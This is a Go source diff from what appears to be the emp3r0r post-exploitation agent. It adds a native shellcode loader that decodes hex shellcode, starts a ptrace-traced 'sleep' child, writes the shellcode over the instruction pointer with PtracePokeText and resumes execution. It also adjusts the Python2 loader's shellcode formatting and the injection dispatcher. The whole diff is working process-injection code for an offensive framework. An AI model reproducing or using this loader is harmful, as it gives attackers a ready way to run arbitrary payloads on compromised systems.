@@ -1,12 +1,14 @@
 package agent
 
 import (
+	"encoding/hex"
 	"fmt"
 	"io/ioutil"
 	"log"
 	"os/exec"
 	"strconv"
 	"strings"
+	"syscall"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/tun"
 )
@@ -39,6 +41,12 @@ func pyShellcodeLoader(shellcode *string, shellcodeLen int) error {
 	if !IsCommandExist("python2") {
 		return fmt.Errorf("python2 is not found, shellcode loader won't work")
 	}
+
+	// format
+	*shellcode = strings.Replace(*shellcode, ",", "", -1)
+	*shellcode = strings.Replace(*shellcode, "0x", "\\x", -1)
+
+	// python2 shellcode loader template
 	pyloader := fmt.Sprintf(`
 import ctypes
 import sys
@@ -91,8 +99,101 @@ if sc_size <= mem_size:
 }
 
 // goShellcodeLoader pure go, using ptrace
-// TODO rewrite the python2 loader in Go
-func goShellcodeLoader(shellcode *string, shellcodeLen int) error {
+func goShellcodeLoader(shellcode *string) error {
+	// format
+	*shellcode = strings.Replace(*shellcode, ",", "", -1)
+	*shellcode = strings.Replace(*shellcode, "0x", "", -1)
+	*shellcode = strings.Replace(*shellcode, "\\x", "", -1)
+
+	// decode hex shellcode string
+	sc, err := hex.DecodeString(*shellcode)
+	if err != nil {
+		return fmt.Errorf("Decode shellcode: %v", err)
+	}
+
+	// start a child process to inject shellcode into
+	sec := strconv.Itoa(RandInt(10, 30))
+	child := exec.Command("sleep", sec)
+	child.SysProcAttr = &syscall.SysProcAttr{Ptrace: true}
+	err = child.Start()
+	if err != nil {
+		return fmt.Errorf("Start `sleep 5`: %v", err)
+	}
+	childPid := child.Process.Pid
+
+	// attach
+	err = child.Wait() // TRAP the child
+	if err != nil {
+		log.Printf("child process wait: %v", err)
+	}
+	log.Printf("goShellcodeLoader: attached to %d", childPid)
+
+	// read RIP
+	regs := &syscall.PtraceRegs{}
+	err = syscall.PtraceGetRegs(childPid, regs)
+	if err != nil {
+		return fmt.Errorf("read regs from %d: %v", childPid, err)
+	}
+	rip := regs.Rip
+	log.Printf("goShellcodeLoader: got RIP (0x%x) of %d", rip, childPid)
+
+	// write shellcode to .text section, where RIP is pointing at
+	n, err := syscall.PtracePokeText(childPid, uintptr(rip), sc)
+	if err != nil {
+		return fmt.Errorf("POKE_TEXT at 0x%x %d: %v", uintptr(rip), childPid, err)
+	}
+	log.Printf("Injected %d bytes at RIP (0x%x)", n, rip)
+
+	// peek: see if shellcode has got injected
+	peekWord := make([]byte, len(sc))
+	n, err = syscall.PtracePeekText(childPid, uintptr(rip), peekWord)
+	if err != nil {
+		return fmt.Errorf("PEEK: 0x%x", rip)
+	}
+	log.Printf("Peeked %d bytes: %x at RIP (0x%x)", n, peekWord, rip)
+
+	// continue and wait
+	err = syscall.PtraceCont(childPid, 0)
+	if err != nil {
+		return fmt.Errorf("Continue: %v", err)
+	}
+	var ws syscall.WaitStatus
+	_, err = syscall.Wait4(childPid, &ws, 0, nil)
+	if err != nil {
+		return fmt.Errorf("continue: wait4: %v", err)
+	}
+	// what happened to our child?
+	switch {
+	case ws.Continued():
+		return nil
+	case ws.CoreDump():
+		err = syscall.PtraceGetRegs(childPid, regs)
+		if err != nil {
+			return fmt.Errorf("read regs from %d: %v", childPid, err)
+		}
+		return fmt.Errorf("continue: core dumped: RIP at 0x%x", regs.Rip)
+	case ws.Exited():
+		return nil
+	case ws.Signaled():
+		err = syscall.PtraceGetRegs(childPid, regs)
+		if err != nil {
+			return fmt.Errorf("read regs from %d: %v", childPid, err)
+		}
+		return fmt.Errorf("continue: signaled (%s): RIP at 0x%x", ws.Signal(), regs.Rip)
+	case ws.Stopped():
+		err = syscall.PtraceGetRegs(childPid, regs)
+		if err != nil {
+			return fmt.Errorf("read regs from %d: %v", childPid, err)
+		}
+		return fmt.Errorf("continue: stopped (%s): RIP at 0x%x", ws.StopSignal().String(), regs.Rip)
+	default:
+		err = syscall.PtraceGetRegs(childPid, regs)
+		if err != nil {
+			return fmt.Errorf("read regs from %d: %v", childPid, err)
+		}
+		log.Printf("continue: RIP at 0x%x", regs.Rip)
+	}
+
 	return nil
 }
 
@@ -116,7 +217,7 @@ func InjectShellcode(pid int, method string) (err error) {
 	case "gdb":
 		err = gdbInjectShellcode(&shellcode, pid, shellcodeLen)
 	case "native":
-		err = goShellcodeLoader(&shellcode, shellcodeLen)
+		err = goShellcodeLoader(&shellcode)
 	case "python":
 		err = pyShellcodeLoader(&shellcode, shellcodeLen)
 	default:
